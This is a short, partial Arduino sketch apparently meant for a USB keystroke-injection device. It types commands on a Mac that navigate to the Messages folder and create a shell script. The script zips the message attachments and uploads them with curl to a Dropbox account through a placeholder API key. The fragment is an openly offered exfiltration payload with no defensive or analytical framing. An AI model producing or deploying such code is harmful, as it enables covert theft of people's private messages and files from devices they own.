...
void setup(){
  ...
  Keyboard.print("/Users/<SYSTEM USERNAME HERE>/Library/Messages/");
  ...
  Keyboard.print(" echo 'cd ~/Desktop && zip -r attachments.zip Attachments && curl -X POST https://content.dropboxapi.com/2/files/upload -H \"Authorization: Bearer <YOUR API KEY HERE>\" -H \"Dropbox-API-Arg: {\\\"path\\\": \\\"/attachments.zip\\\",\\\"mode\\\": \\\"add\\\",\\\"autorename\\\": true,\\\"mute\\\": false}\" -H \"Content-Type: application/octet-stream\" --data-binary @attachments.zip' > upload.sh");
